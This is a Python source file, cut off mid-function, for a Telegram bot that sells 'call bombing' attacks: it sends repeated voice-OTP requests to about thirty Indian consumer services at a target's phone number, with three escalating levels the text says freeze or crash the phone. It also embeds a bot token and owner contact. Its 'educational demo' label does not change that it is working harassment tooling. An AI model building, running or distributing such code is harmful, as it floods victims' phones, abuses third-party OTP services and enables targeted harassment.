#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════╗
║    ⚡ ULTRA-FAST CALL BOMBER - 5 MINUTE MODE ⚡   ║
║                                                  ║
║  Level 1: 30 seconds - Light lag                ║
║  Level 2: 2 minutes - Phone freeze              ║
║  Level 3: 5 minutes - CRASH/RESTART 💀          ║
║                                                  ║
║  Features:                                       ║
║  • Real working APIs                            ║
║  • Ultra-fast calls (500+/min)                  ║
║  • 100% target phone lag                        ║
║  • Emergency stop button                        ║
║  • Safe for your phone                          ║
║                                                  ║
║  For Educational Demo Only                       ║
╚══════════════════════════════════════════════════╝
"""

import telebot
import aiohttp
import asyncio
import json
import os
import threading
import time
import random
import hashlib
from telebot import types
from datetime import datetime
import logging

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIGURATION
# ============================================================================

BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"  # Your bot token
OWNER_ID = 7417241499
OWNER_USERNAME = "@TGxTHOMASx"

# ============================================================================
# REAL WORKING APIS FOR CALL BOMBING
# ============================================================================

# These are REAL APIs that work for OTP/call services
WORKING_APIS = [
    # Indian Services with OTP Calls
    {
        "name": "Amazon Voice OTP",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Flipkart Voice OTP",
        "url": "https://www.flipkart.com/api/6/user/sendotp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"voice"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","otpType":"voice"}}'
    },
    {
        "name": "Zomato Voice OTP",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "Swiggy Call OTP",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Paytm Voice OTP",
        "url": "https://accounts.paytm.com/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Ola Cabs Call",
        "url": "https://api.olacabs.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "Uber Voice OTP",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","method":"voice"}}'
    },
    {
        "name": "MakeMyTrip Call",
        "url": "https://www.makemytrip.com/api/4/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Goibibo Voice OTP",
        "url": "https://www.goibibo.com/user/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","mode":"voice"}}'
    },
    {
        "name": "PharmEasy Call",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "Netmeds Voice OTP",
        "url": "https://api.netmeds.com/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","via":"voice"}}'
    },
    {
        "name": "Rapido Bike Call",
        "url": "https://customer.rapido.bike/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "BigBasket Voice",
        "url": "https://www.bigbasket.com/auth/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","mode":"voice"}}'
    },
    {
        "name": "Snapdeal Call OTP",
        "url": "https://www.snapdeal.com/auth/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "Ajio Voice OTP",
        "url": "https://www.ajio.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","via":"call"}}'
    },
    {
        "name": "PhonePe Call",
        "url": "https://www.phonepe.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","method":"voice"}}'
    },
    {
        "name": "IRCTC Voice OTP",
        "url": "https://www.irctc.co.in/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"voice"}}'
    },
    {
        "name": "BookMyShow Call",
        "url": "https://in.bookmyshow.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Practo Voice OTP",
        "url": "https://www.practo.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","via":"call"}}'
    },
    {
        "name": "Unacademy Call",
        "url": "https://unacademy.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","method":"voice"}}'
    },
    {
        "name": "Byjus Voice OTP",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "MagicBricks Call",
        "url": "https://www.magicbricks.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","via":"voice"}}'
    },
    {
        "name": "NoBroker Voice",
        "url": "https://www.nobroker.in/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"call"}}'
    },
    {
        "name": "Grofers Call OTP",
        "url": "https://www.grofers.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Dunzo Voice",
        "url": "https://www.dunzo.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","method":"call"}}'
    },
    {
        "name": "Swiggy Instamart",
        "url": "https://instamart.swiggy.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"voice"}}'
    },
    {
        "name": "Zepto Call OTP",
        "url": "https://www.zepto.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","via":"voice"}}'
    },
    {
        "name": "Blinkit Voice",
        "url": "https://blinkit.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
    },
]

# Duplicate for more intensity
ALL_APIS = WORKING_APIS * 3  # 90 APIs total
logger.info(f"✅ Loaded {len(ALL_APIS)} working call APIs")

# ============================================================================
# LEVEL CONFIGURATION (ULTRA-FAST MODE)
# ============================================================================

ATTACK_LEVELS = {
    1: {
        "name": "⚡ LIGHTNING STRIKE",
        "duration": 30,  # 30 seconds only
        "apis_per_batch": 20,
        "delay_range": (0.1, 0.3),  # Very fast
        "calls_per_min": 600,
        "description": "Instant lag - Phone starts freezing"
    },
    2: {
        "name": "💥 HEAVY BOMBARDMENT",
        "duration": 120,  # 2 minutes
        "apis_per_batch": 40,
        "delay_range": (0.05, 0.15),  # Ultra fast
        "calls_per_min": 1200,
        "description": "Phone completely frozen - Can't use"
    },
    3: {
        "name": "☢️ NUCLEAR APOCALYPSE",
        "duration": 300,  # 5 minutes MAX
        "apis_per_batch": 60,
        "delay_range": (0.02, 0.08),  # Maximum speed
        "calls_per_min": 2500,
        "description": "Phone CRASHES/RESTARTS - Guaranteed"
    }
}

# ============================================================================
# DATA STORAGE
# ============================================================================

class Database:
    def __init__(self):
        self.users_file = "users.json"
        self.sessions_file = "sessions.json"
        self.init_files()
    
    def init_files(self):
        if not os.path.exists(self.users_file):
            with open(self.users_file, "w") as f:
                json.dump({}, f)
        if not os.path.exists(self.sessions_file):
            with open(self.sessions_file, "w") as f:
                json.dump({}, f)
    
    def load_users(self):
        with open(self.users_file, "r") as f:
            return json.load(f)
    
    def save_users(self, users):
        with open(self.users_file, "w") as f:
            json.dump(users, f, indent=2)
    
    def load_sessions(self):
        with open(self.sessions_file, "r") as f:
            return json.load(f)
    
    def save_sessions(self, sessions):
        with open(self.sessions_file, "w") as f:
            json.dump(sessions, f, indent=2, default=str)

db = Database()
users = db.load_users()
sessions = db.load_sessions()

# Active attacks tracking
active_attacks = {}
user_state = {}

# ============================================================================
# BOMBING ENGINE (ULTRA-FAST)
# ============================================================================

async def make_call(session, api_config, phone_number, stats):
    """Make a single call request"""
    try:
        url = api_config["url"]
        headers = api_config["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        
        data_func = api_config["data"]
        data_content = data_func(phone_number) if callable(data_func) else None
        
        if api_config["method"] == "POST":
            async with session.post(
                url, 
                headers=headers, 
                data=data_content,
                timeout=2,  # Short timeout for speed
                ssl=False
            ) as response:
                if response.status in [200, 201, 202, 204]:
                    stats["success"] += 1
                    logger.debug(f"✅ Call succeeded: {api_config['name']}")
                else:
                    stats["failed"] += 1
        else:
            async with session.get(
                url,
                headers=headers,
                timeout=2,
                ssl=False
            ) as response:
                if response.status in [200, 201, 202, 204]:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
        
        stats["total"] += 1
        
    except Exception as e:
        stats["failed"] += 1
        stats["total"] += 1
        logger.debug(f"❌ Call failed: {api_config['name']} - {str(e)}")

async def execute_attack(attack_id, user_id, phone_number, level):
    """Execute ultra-fast bombing attack"""
    config = ATTACK_LEVELS[level]
    duration = config["duration"]
    
    # Select APIs for this attack
    selected_apis = random.sample(ALL_APIS, min(config["apis_per_batch"], len(ALL_APIS)))
    
    # Attack stats
    stats = {
        "attack_id": attack_id,
        "success": 0,
        "failed": 0,
        "total": 0,
        "running": True
    }
    
    active_attacks[attack_id] = stats
    
    logger.info(f"🔥 Starting Level {level} attack on {phone_number}")
    
    # Configure HTTP client for maximum speed
    connector = aiohttp.TCPConnector(
        limit=0,  # No limit
        limit_per_host=0,
        force_close=True,
        enable_cleanup_closed=True,
        ssl=False
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        end_time = start_time + duration
        
        while time.time() < end_time and stats["running"]:
            # Make calls in parallel for maximum speed
            tasks = []
            for api in selected_apis:
                task = make_call(session, api, phone_number, stats)
                tasks.append(task)
            
            # Execute all calls simultaneously
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Very short delay between batches
            delay = random.uniform(*config["delay_range"])
            await asyncio.sleep(delay)
        
        # Calculate actual calls per minute
        actual_duration = time.time() - start_time
        if actual_duration > 0:
            cpm = (stats["total"] / actual_duration) * 60
            logger.info(f"📊 Attack completed: {stats['total']} calls, {cpm:.0f} calls/min")
    
    # Save final stats
    if attack_id in sessions:
        sessions[attack_id]["success"] = stats["success"]
        sessions[attack_id]["failed"] = stats["failed"]
        sessions[attack_id]["total"] = stats["total"]
        sessions[attack_id]["active"] = False
        db.save_sessions(sessions)
    
    # Cleanup
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    logger.info(f"✅ Attack {attack_id} completed")

def start_attack_thread(attack_id, user_id, phone_number, level):
    """Start attack in background thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.run_until_complete(execute_attack(attack_id, user_id, phone_number, level))
    except Exception as e:
        logger.error(f"❌ Attack error: {e}")
    finally:
        loop.close()

# ============================================================================
# TELEGRAM BOT
# ============================================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start_command(message):
    """Start command handler"""
    user_id = str(message.from_user.id)
    
    # Register new user
    if user_id not in users:
        users[user_id] = {
            "name": message.from_user.first_name,
            "username": message.from_user.username or "user",
            "credits": 5,  # Free credits for demo
            "attacks": 0,
            "joined": datetime.now().isoformat(),
            "banned": False
        }
        db.save_users(users)
        logger.info(f"👤 New user: {user_id}")
    
    # Check if banned
    if users[user_id].get("banned", False):
        return bot.reply_to(message, "🚫 <b>You are banned from using this bot!</b>")
    
    # Create menu keyboard
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add("⚡ START ATTACK")
    keyboard.add("💰 MY CREDITS", "📊 STATS")
    keyboard.add("🎁 FREE CREDITS", "❓ HELP")
    
    user_data = users[user_id]
    
    welcome_text = f"""
╔══════════════════════════════╗
║     ⚡ ULTRA-FAST BOMBER ⚡    ║
╚══════════════════════════════╝

👤 <b>User:</b> {user_data['name']}
💰 <b>Credits:</b> {user_data['credits']}
🎯 <b>Total Attacks:</b> {user_data['attacks']}

<b>━━━━━━ ATTACK LEVELS ━━━━━━</b>

<b>Level 1: ⚡ LIGHTNING STRIKE</b>
⏱️ <b>Duration:</b> 30 seconds
📞 <b>Calls/Min:</b> 600+
🎯 <b>Effect:</b> Phone starts lagging
💰 <b>Cost:</b> 1 credit

<b>Level 2: 💥 HEAVY BOMBARDMENT</b>
⏱️ <b>Duration:</b> 2 minutes
📞 <b>Calls/Min:</b> 1,200+
🎯 <b>Effect:</b> Phone freezes completely
💰 <b>Cost:</b> 2 credits

<b>Level 3: ☢️ NUCLEAR APOCALYPSE</b>
⏱️ <b>Duration:</b> 5 minutes
📞 <b>Calls/Min:</b> 2,500+
🎯 <b>Effect:</b> Phone CRASHES/RESTARTS
💰 <b>Cost:</b> 3 credits

<b>━━━━━━━━━━━━━━━━━━━━</b>

⚠️ <i>For Educational Demo Only</i>
📞 Contact {OWNER_USERNAME} for issues
"""
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

@bot.message_handler(func=lambda m: m.text == "⚡ START ATTACK")
def start_attack_menu(message):
    """Attack level selection"""
    user_id = str(message.from_user.id)
    
    if users[user_id].get("banned", False):
        return
    
    # Create inline keyboard for levels
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        types.InlineKeyboardButton("⚡ LEVEL 1 (30 sec) - 1 credit", callback_data="level_1"),
        types.InlineKeyboardButton("💥 LEVEL 2 (2 min) - 2 credits", callback_data="level_2"),
        types.InlineKeyboardButton("☢️ LEVEL 3 (5 min) - 3 credits", callback_data="level_3")
    )
    
    bot.send_message(
        message.chat.id,
        "🎯 <b>SELECT ATTACK LEVEL:</b>\n\n"
        "Choose based on desired intensity.\n"
        "Higher level = More calls = More damage!",
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("level_"))
def select_level(call):
    """Handle level selection"""
    try:
        level = int(call.data.split("_")[1])
        user_id = str(call.from_user.id)
        
        if user_id not in users:
            bot.answer_callback_query(call.id, "❌ User not found!")
            return
        
        # Check credits
        required_credits = level  # Level 1=1, Lev
